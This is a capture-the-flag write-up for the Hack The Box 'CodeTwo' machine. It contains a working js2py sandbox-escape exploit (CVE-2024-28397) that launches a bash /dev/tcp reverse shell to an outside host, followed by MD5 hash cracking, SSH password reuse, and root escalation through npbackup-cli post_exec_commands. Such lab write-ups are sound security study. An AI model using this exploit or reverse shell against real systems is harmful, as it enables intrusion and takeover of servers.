| **Machine**             | CodeTwo                                                                                                               |
| :---------------------- | :------------------------------------------------------------------------------------------------------------------------------- |
| **Platform**            | Hack The Box                                                                                                                     |
| **Difficulty**          | Easy                                                                                                                           |
| Key Vulnerabilities | RCE via js2py sandbox escape (CVE-2024-28397) in run_code, Source code disclosure (downloadable bundle) enabling white-box analysis, Weak password hashing (MD5) → offline crack → SSH reuse, Privilege escalation via sudo NOPASSWD /usr/local/bin/npbackup-cli (executes post_exec_commands from attacker-supplied config) |
| Tools Used | nmap, Burp Suite, js2py PoC, nc, Python, wget, sqlite3, hashcat, ssh |
## Reconnaissance

Running Nmap, we see two ports open: SSH and HTTP on port 8000, which is running Gunicorn version 20.0.4.

```bash
└─$ sudo nmap -sCV 10.129.151.7 -p- --min-rate=1000 -oN nmap_long
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-17 05:19 EDT
Nmap scan report for 10.129.151.7
Host is up (0.037s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a0:47:b4:0c:69:67:93:3a:f9:b4:5d:b3:2f:bc:9e:23 (RSA)
|   256 7d:44:3f:f1:b1:e2:bb:3d:91:d5:da:58:0f:51:e5:ad (ECDSA)
|_  256 f1:6b:1d:36:18:06:7a:05:3f:07:57:e1:ef:86:b4:85 (ED25519)
8000/tcp open  http    Gunicorn 20.0.4
|_http-title: Welcome to CodeTwo
|_http-server-header: gunicorn/20.0.4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 62.11 seconds
```
Visiting the page, we see it's a sandbox to run JavaScript code. We can log in, register, and download source code, which I'm going to do.

<img width="3782" height="1050" alt="2025-08-17 112207" src="https://github.com/user-attachments/assets/6015cb52-a4cc-4cf8-b0a4-cdb943ae9195" />

Unzipping the file, we find a few interesting files, like the user database file—but it's empty.

```bash

└─$ ls -R
.:
app.py  instance  requirements.txt  static  templates

./instance:
users.db

./static:
css  js

./static/css:
styles.css

./static/js:
script.js

./templates:
base.html  dashboard.html  index.html  login.html  register.html  reviews.html
```
I will analyze the app.py code

<img width="2283" height="1470" alt="2025-08-17 112740" src="https://github.com/user-attachments/assets/d1cb838e-0b67-42d2-abb0-43cf53d25784" />

The Flask app is using SQLite via SQLAlchemy.
We notice that upon registration, the password is stored with an MD5 hash, which is not safe!

And the run_code function is using js2py

```bash
def run_code():
    try:
        code = request.json.get('code')
        result = js2py.eval_js(code)
        return jsonify({'result': result})
    except Exception as e:
        return jsonify({'error': str(e)})
```

## Foothold
Searching for an exploit in js2py, I find CVE-2024-28397.

>CVE-2024-28397 is sandbox escape in js2py (<=0.74) which is a popular python package that can evaluate javascript code inside a python interpreter. The vulnerability allows for an attacker to obtain a reference to a python object in the js2py environment enabling them


We can find a PoC here:
https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape

I will modify the code to run it in our sandbox

```JavaScript
var hacked = Object.getOwnPropertyNames({});
var bymarve = hacked.__getattribute__;
var n11 = bymarve("__getattribute__");
var obj = n11("__class__").__base__;

function findPopen(o) {
    var subs = o.__subclasses__();
    for (var i in subs) {
        try {
            var item = subs[i];
            // solo chequea si tiene atributos de módulo y nombre
            if (item && item.__module__ && item.__name__) {
                if (item.__module__ == "subprocess" && item.__name__ == "Popen") {
                    return item;
                }
            }
            if (item && item.__name__ != "type") {
                var result = findPopen(item);
                if (result) return result;
            }
        } catch(e) {
            // ignorar errores de acceso
            continue;
        }
    }
    return null;
}

var Popen = findPopen(obj);
if (Popen) {
    var cmd = "bash -c 'exec 5<>/dev/tcp/10.10.14.64/9001; cat <&5 | while read line; do $line 2>&5 >&5; done'";
    var out = Popen(cmd, -1, null, -1, -1, -1, null, null, true).communicate();
    console.log(out);
} else {
    console.log("Popen no encontrado");
}
```
After running it, i get a reverse shell connect back.

<img width="953" height="314" alt="2025-08-17 120712" src="https://github.com/user-attachments/assets/7e84c3bb-7121-4b49-ba2a-cbc0bc5bde0c" />

In /home/app/app/instances there is a users.db file, exactly like the file we downloaded earlier from the site. I will start a Python server and download the file.

```bash
└─$ wget http://10.129.151.7:8080/users.db 
--2025-08-17 06:10:02--  http://10.129.151.7:8080/users.db
Connecting to 10.129.151.7:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16384 (16K) [application/octet-stream]
Saving to: ‘users.db’

users.db                                                            100%[=================================================================================================================================================================>]  16.00K  91.3KB/s    in 0.2s    

2025-08-17 06:10:03 (91.3 KB/s) - ‘users.db’ saved [16384/16384]
```

Inspecting the database, this time we see there are creds stored in MD5 hash format

```bash
└─$ sqlite3 users.db               
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> .tables
code_snippet  user        
sqlite> select * from user;
1|marco|649c9d65a206a75f5abe509fe128bce5
2|app|a97588c0e2fa3a024876339e27aeb42e
sqlite> 

```
Running Hashcat, we successfully crack the hash.

<img width="1256" height="870" alt="2025-08-17 121214" src="https://github.com/user-attachments/assets/895690a0-bfae-426f-b2fc-a1fd12b6b2c1" />

Now we can authenticate with SSH and grab the user flag.

```bash
└─$ ssh marco@10.129.151.7         
The authenticity of host '10.129.151.7 (10.129.151.7)' can't be established.
ED25519 key fingerprint is SHA256:KGKFyaW9Pm7DDxZe/A8oi/0hkygmBMA8Y33zxkEjcD4.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.151.7' (ED25519) to the list of known hosts.
marco@10.129.151.7's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-216-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sun 17 Aug 2025 10:12:53 AM UTC

  System load:           0.0
  Usage of /:            57.0% of 5.08GB
  Memory usage:          24%
  Swap usage:            0%
  Processes:             232
  Users logged in:       0
  IPv4 address for eth0: 10.129.151.7
  IPv6 address for eth0: dead:beef::250:56ff:fe94:1f6e


Expanded Security Maintenance for Infrastructure is not enabled.

0 updates can be applied immediately.

Enable ESM Infra to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


Last login: Sun Aug 17 10:12:54 2025 from 10.10.14.64
marco@codetwo:~$ cat user.txt
<REDACTED>
```
## Privilege Escalation
Running sudo -l, we see that we can run /usr/local/bin/npbackup-cli with sudo rights.

```bash
marco@codetwo:~$ sudo -l
Matching Defaults entries for marco on codetwo:
   env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User marco may run the following commands on codetwo:
   (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
```
Lets inspect the file
```bash
#!/usr/bin/python3
# -*- coding: utf-8 -*-
import re
import sys
from npbackup.__main__ import main
if __name__ == '__main__':
    # Block restricted flag
    if '--external-backend-binary' in sys.argv:
        print("Error: '--external-backend-binary' flag is restricted for use.")
        sys.exit(1)

    sys.argv[0] = re.sub(r'(-script\.pyw|\.exe)?$', '', sys.argv[0])
    sys.exit(main())
```
To run it, we need to provide a config file, which is in our home directory—but we can't edit it.

```bash
marco@codetwo:~$ sudo /usr/local/bin/npbackup-cli -c npbackup.conf  
2025-08-17 10:22:00,208 :: INFO :: npbackup 3.0.1-linux-UnknownBuildType-x64-legacy-public-3.8-i 2025032101 - Copyright (C) 2022-2025 NetInvent running as root
2025-08-17 10:22:00,239 :: INFO :: Loaded config 4E3B3BFD in /home/marco/npbackup.conf
2025-08-17 10:22:00,249 :: WARNING :: No operation has been requested. Try --help
2025-08-17 10:22:00,256 :: INFO :: ExecTime = 0:00:00.050807, finished, state is: warnings.
```
Let's check the config file.
<img width="2526" height="1237" alt="2025-08-17 123337" src="https://github.com/user-attachments/assets/8aade9cb-806a-4ca6-932c-1cd15f42d6e5" />

## Creating a Malicious Config File

We will create a malicious config file, supplying all the normal sections like conf_version or repos so it looks legit.

Reading the code, we see that it runs post_exec_commands—these are commands that the backup program executes after finishing the task.

I will insert this code into the file:

```bash
mkdir -p /tmp/rootbackup
cp /root/root.txt /tmp/rootbackup/flag.txt
chmod 755 /tmp/rootbackup/flag.txt
chown marco:marco /tmp/rootbackup/flag.txt
```
This will copy the root flag into /tmp/rootbackup, owned by my user marco, so I can read the flag.
After creating the config file, we can run it.

```bash
marco@codetwo:~$ sudo /usr/local/bin/npbackup-cli -c /tmp/malicious.conf -b --force     
```
Now we can read the root flag.
```bash
marco@codetwo:~$ cat /tmp/rootbackup/flag.txt
5f32fe<REDACTED>
```
Done.

